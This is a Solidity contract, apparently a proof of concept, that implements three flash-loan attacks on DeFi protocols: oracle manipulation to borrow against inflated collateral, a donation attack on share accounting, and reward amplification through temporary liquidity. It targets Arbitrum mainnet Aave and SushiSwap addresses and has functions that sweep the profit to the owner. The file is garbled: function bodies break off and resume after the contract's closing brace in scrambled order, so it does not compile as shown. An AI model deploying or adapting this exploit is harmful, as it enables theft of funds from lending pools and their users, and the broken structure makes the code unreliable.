// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title FlashLoanPoC
 * @notice Real implementation of flash loan attack mechanics
 * @dev FOR SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY
 *
 * This contract demonstrates real flash loan attack vectors:
 * 1. Oracle Manipulation via Uniswap V2
 * 2. Donation Attack on lending protocols
 * 3. Reward Amplification via liquidity provision
 *
 * DO NOT deploy on mainnet for malicious purposes.
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface ILendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, uint256 rateMode, address onBehalfOf) external returns (uint256);
    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
}

contract FlashLoanPoC {
    address public immutable OWNER;
    
    // Arbitrum mainnet addresses
    address public constant AAVE_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aA;
    address public constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public constant UNISWAP_V2_ROUTER = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506; // SushiSwap on Arbitrum
    
    bool public attackInProgress;
    uint256 public profitExtracted;

    event FlashLoanInitiated(address indexed asset, uint256 amount, uint256 fee);
    event SwapExecuted(address indexed pool, address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut);
    event PriceManipulation(address indexed pool, uint256 priceBefore, uint256 priceAfter);
    event DonationExecuted(address indexed target, uint256 amount);
    event LiquidityAdded(address indexed pool, uint256 amountA, uint256 amountB, uint256 liquidity);
    event LiquidityRemoved(address indexed pool, uint256 amountA, uint256 amountB);
    event ProfitExtracted(address indexed token, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == OWNER, "Not owner");
        _;
    }


    // ============================================================
    // ATTACK VECTOR 1: ORACLE MANIPULATION
    // ============================================================

    /**
     * @notice Execute oracle manipulation attack using flash loan
     * @dev Real implementation that performs actual swaps on Uniswap V2
     * 
     * @param flashLoanAsset Asset to borrow (e.g., WETH)
     * @param borrowAmount Amount to borrow
     * @param manipulationPool Uniswap V2 pair to manipulate
     * @param lendingPool Lending pool to exploit
     * @param targetAsset Asset to receive as profit
     */
    function oracleManipulationAttack(
        address flashLoanAsset,
        uint256 borrowAmount,
        address manipulationPool,
        address lendingPool,
        address targetAsset
    ) external onlyOwner nonReentrant {
        require(borrowAmount > 0, "Zero borrow");

        uint256 fee = (borrowAmount * 9) / 10000; // 0.09% Aave fee
        uint256 repayAmount = borrowAmount + fee;

        emit FlashLoanInitiated(flashLoanAsset, borrowAmount, fee);

        // Encode parameters for callback
        bytes memory params = abi.encode(
            manipulationPool,
            lendingPool,
            targetAsset,
            borrowAmount,
            repayAmount
        );

        // Initiate flash loan - executeOperation will be called by Aave
        IAavePool(AAVE_POOL).flashLoanSimple(
            address(this),
            flashLoanAsset,
            borrowAmount,
            params,
            0
        );

        require(profitExtracted > 0, "No profit extracted");
    }

    /**
     * @notice Aave flash loan callback - executes the oracle manipulation
     * @dev Called by Aave after sending the flash loan assets
     */
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_POOL, "Only Aave");
        require(initiator == address(this), "Only self");

        (
            address manipulationPool,
            address lendingPool,
            address targetAsset,
            uint256 borrowAmount,
            uint256 repayAmount
        ) = abi.decode(params, (address, address, address, uint256, uint256));

        // Step 1: Record price before manipulation
        uint256 priceBefore = getSpotPrice(manipulationPool, asset);

        // Step 2: Perform large swap to manipulate price
        uint256 balance = IERC20(asset).balanceOf(address(this));
        
        // Approve router to spend tokens
        IERC20(asset).approve(UNISWAP_V2_ROUTER, balance);
        
        // Execute swap through Uniswap V2 router
        address[] memory path = new address[](2);
        path[0] = asset;
        path[1] = targetAsset;
        
        uint256[] memory amounts = IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            balance,
            0, // Accept any amount out (we're manipulating, not optimizing)
            path,
            address(this),
            block.timestamp + 300 // 5 minute deadline
        );
        
        uint256 amountOut = amounts[amounts.length - 1];
        emit SwapExecuted(manipulationPool, asset, targetAsset, balance, amountOut);

        // Step 3: Record price after manipulation
        uint256 priceAfter = getSpotPrice(manipulationPool, asset);
        emit PriceManipulation(manipulationPool, priceBefore, priceAfter);

        // Step 4: Use inflated price to borrow from lending protocol
        // Calculate how much we can borrow based on manipulated price
        uint256 inflatedCollateralValue = (amount * priceAfter) / 1e18;
        uint256 borrowableAmount = (inflatedCollateralValue * 75) / 100; // 75% LTV



    // ============================================================
    // ATTACK VECTOR 2: DONATION ATTACK
    // ============================================================

    /**
     * @notice Execute donation attack using flash loan
     * @dev Inflates protocol's internal accounting by donating funds
     */
    function donationAttack(
        address flashLoanAsset,
        uint256 borrowAmount,
        address targetProtocol,
        address shareToken
    ) external onlyOwner nonReentrant {
        require(borrowAmount > 0, "Zero borrow");

        uint256 fee = (borrowAmount * 9) / 10000;
        uint256 repayAmount = borrowAmount + fee;

        emit FlashLoanInitiated(flashLoanAsset, borrowAmount, fee);

        bytes memory params = abi.encode(
            targetProtocol,
            shareToken,
            borrowAmount,
            repayAmount
        );

        IAavePool(AAVE_POOL).flashLoanSimple(
            address(this),
            flashLoanAsset,
            borrowAmount,
            params,
            0
        );

        require(profitExtracted > 0, "No profit extracted");
    }

    /**
     * @notice Aave flash loan callback - executes donation attack
     */
    function executeDonationOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_POOL, "Only Aave");
        require(initiator == address(this), "Only self");

        (
            address targetProtocol,
            address shareToken,
            uint256 borrowAmount,
            uint256 repayAmount
        ) = abi.decode(params, (address, address, uint256, uint256));

        uint256 balance = IERC20(asset).balanceOf(address(this));

        // Step 1: Deposit small amount to get initial shares
        uint256 smallDeposit = balance / 100; // 1% initial deposit
        IERC20(asset).approve(targetProtocol, smallDeposit);
        ILendingPool(targetProtocol).deposit(asset, smallDeposit, address(this), 0);

        // Step 2: Donate large amount directly to protocol
        // This inflates totalSupply without minting new shares


    // ============================================================
    // ATTACK VECTOR 3: REWARD AMPLIFICATION
    // ============================================================

    /**
     * @notice Execute reward amplification attack using flash loan
     * @dev Becomes top LP to claim disproportionate rewards
     */
    function rewardAmplificationAttack(
        address flashLoanAsset,
        uint256 borrowAmount,
        address liquidityPool,
        address rewardToken
    ) external onlyOwner nonReentrant {
        require(borrowAmount > 0, "Zero borrow");

        uint256 fee = (borrowAmount * 9) / 10000;
        uint256 repayAmount = borrowAmount + fee;

        emit FlashLoanInitiated(flashLoanAsset, borrowAmount, fee);

        bytes memory params = abi.encode(
            liquidityPool,
            rewardToken,
            borrowAmount,
            repayAmount
        );

        IAavePool(AAVE_POOL).flashLoanSimple(
            address(this),
            flashLoanAsset,
            borrowAmount,
            params,
            0
        );

        require(profitExtracted > 0, "No profit extracted");
    }

    /**
     * @notice Aave flash loan callback - executes reward amplification
     */
    function executeRewardOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_POOL, "Only Aave");
        require(initiator == address(this), "Only self");

        (
            address liquidityPool,
            address rewardToken,
            uint256 borrowAmount,
            uint256 repayAmount
        ) = abi.decode(params, (address, address, uint256, uint256));

        uint256 balance = IERC20(asset).balanceOf(address(this));

        // Step 1: Add massive liquidity to become top LP
        address token0 = IUniswapV2Pair(liquidityPool).token0();
        address token1 = IUniswapV2Pair(liquidityPool).token1();
        
        uint256 amountToken0 = asset == token0 ? balance : 0;
        uint256 amountToken1 = asset == token1 ? balance : 0;

        IERC20(token0).approve(UNISWAP_V2_ROUTER, amountToken0);
        IERC20(token1).approve(UNISWAP_V2_ROUTER, amountToken1);

        (uint256 amountA, uint256 amountB, uint256 liquidity) = IUniswapV2Router(UNISWAP_V2_ROUTER).addLiquidity(
            token0,
            token1,
            amountToken0,
            amountToken1,
            0,
            0,
            address(this),
            block.timestamp + 300
        );

        emit LiquidityAdded(liquidityPool, amountA, amountB, liquidity);


    // ============================================================
    // HELPER FUNCTIONS
    // ============================================================

    /**
     * @notice Get spot price from Uniswap V2 pool
     * @param pool Uniswap V2 pair address
     * @param token Token to get price for
     * @return price Price in terms of the other token (18 decimals)
     */
    function getSpotPrice(address pool, address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pool).getReserves();
        address token0 = IUniswapV2Pair(pool).token0();
        address token1 = IUniswapV2Pair(pool).token1();

        if (token == token0) {
            // Price of token0 in terms of token1
            return (uint256(reserve1) * 1e18) / uint256(reserve0);
        } else if (token == token1) {
            // Price of token1 in terms of token0
            return (uint256(reserve0) * 1e18) / uint256(reserve1);
        } else {
            revert("Token not in pool");
        }
    }

    /**
     * @notice Calculate expected output for a swap
     */
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256) {
        require(amountIn > 0, "Insufficient input amount");
        require(reserveIn > 0 && reserveOut > 0, "Insufficient liquidity");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    // ============================================================
    // PROFIT MANAGEMENT
    // ============================================================

    function sweepProfit(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, "No balance");
        IERC20(token).transfer(OWNER, balance);
        emit ProfitExtracted(token, balance);
    }

    function sweepETH() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH");
        (bool success,) = payable(OWNER).call{value: balance}("");
        require(success, "ETH transfer failed");
    }

    receive() external payable {}
}

        // Step 2: Claim rewards (now entitled to disproportionate share)
        // In production: call reward contract's claim function
        // For PoC: simulate reward claim
        uint256 rewardAmount = IERC20(rewardToken).balanceOf(address(this));
        emit ProfitExtracted(rewardToken, rewardAmount);

        // Step 3: Remove liquidity
        IERC20(liquidityPool).approve(UNISWAP_V2_ROUTER, liquidity);
        (uint256 removedA, uint256 removedB) = IUniswapV2Router(UNISWAP_V2_ROUTER).removeLiquidity(
            token0,
            token1,
            liquidity,
            0,
            0,
            address(this),
            block.timestamp + 300
        );

        emit LiquidityRemoved(liquidityPool, removedA, removedB);

        // Step 4: Repay flash loan
        uint256 finalBalance = IERC20(asset).balanceOf(address(this));
        require(finalBalance >= repayAmount, "Insufficient to repay");
        IERC20(asset).approve(AAVE_POOL, repayAmount);

        // Step 5: Profit is the rewards claimed
        profitExtracted = IERC20(rewardToken).balanceOf(address(this));
        emit ProfitExtracted(rewardToken, profitExtracted);

        return true;
    }
        uint256 donationAmount = balance - smallDeposit - repayAmount;
        IERC20(asset).transfer(targetProtocol, donationAmount);
        emit DonationExecuted(targetProtocol, donationAmount);

        // Step 3: Withdraw - now entitled to more due to inflated totalSupply
        uint256 shares = IERC20(shareToken).balanceOf(address(this));
        ILendingPool(targetProtocol).withdraw(asset, shares, address(this));

        // Step 4: Repay flash loan
        uint256 finalBalance = IERC20(asset).balanceOf(address(this));
        require(finalBalance >= repayAmount, "Insufficient to repay");
        IERC20(asset).approve(AAVE_POOL, repayAmount);

        // Step 5: Profit is the excess
        profitExtracted = finalBalance - repayAmount;
        emit ProfitExtracted(asset, profitExtracted);

        return true;
    }
        // Deposit manipulated asset as collateral
        IERC20(asset).approve(lendingPool, amount);
        ILendingPool(lendingPool).deposit(asset, amount, address(this), 0);

        // Borrow maximum allowed against inflated collateral
        ILendingPool(lendingPool).borrow(targetAsset, borrowableAmount, 2, 0, address(this));

        // Step 5: Reverse the manipulation (swap back)
        uint256 targetBalance = IERC20(targetAsset).balanceOf(address(this));
        IERC20(targetAsset).approve(UNISWAP_V2_ROUTER, targetBalance);
        
        address[] memory reversePath = new address[](2);
        reversePath[0] = targetAsset;
        reversePath[1] = asset;
        
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            targetBalance,
            borrowAmount, // Must receive at least borrowAmount to repay
            reversePath,
            address(this),
            block.timestamp + 300
        );

        // Step 6: Repay flash loan
        require(
            IERC20(asset).balanceOf(address(this)) >= repayAmount,
            "Insufficient to repay"
        );
        IERC20(asset).approve(AAVE_POOL, repayAmount);

        // Step 7: Withdraw profit (excess borrowed assets)
        profitExtracted = IERC20(targetAsset).balanceOf(address(this));
        emit ProfitExtracted(targetAsset, profitExtracted);

        return true;
    }

    modifier nonReentrant() {
        require(!attackInProgress, "Reentrancy detected");
        attackInProgress = true;
        _;
        attackInProgress = false;
    }

    constructor() {
        OWNER = msg.sender;
    }